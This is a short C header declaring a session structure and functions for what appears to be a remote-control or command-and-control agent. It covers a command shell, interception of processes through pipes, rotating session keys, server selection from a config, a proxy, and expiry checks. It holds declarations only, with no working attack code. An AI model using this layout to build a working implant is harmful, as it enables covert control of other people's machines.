#pragma once
#ifndef SESSION_H
#define SESSION_H
#include <stdint.h>
#include <stdbool.h>
#include "cJSON.h"
#include "agent_shell.h"
#include "agent_event.h"
#include "agent_network.h"

typedef struct process_intercepted_s process_intercepted;
struct process_intercepted_s {
	process_handle* process;
	process_intercepted* next;
	pipe_handle* pipe;
	event_handle* interceptor_event;
	uint32_t process_pid;
};

typedef struct session_s session;
struct session_s {
	char* prog_name;
	char* public_IP;
	size_t session_id_size;
	char* session_id;		
	uint8_t* original_session_key;
	uint8_t* session_key;
	uint32_t session_key_iteration;
	process_intercepted* intercepted_processes;
	bool is_established;
	bool exit;
	command_shell* shell;
	bool volatile quit_shell;
	cJSON* active_server;
	uint32_t active_server_index;
	char* active_server_type;
	cJSON* config;
	void* net_mutex;	
	event_handle* single_instance_event;
	proxy* proxy;
	thread_handle** thread_handles;
};

bool session_refresh(session* sess);
session* session_create(char* jconfig, char const* prog_name);
session* session_free(session* sess);
bool is_agent_expired(session* sess);
thread_handle* session_start_thread(thread_proc callback, void* args, session* sess);
bool session_add_thread(thread_handle* thread, session* sess);
bool session_release_garbage(session* sess);

#endif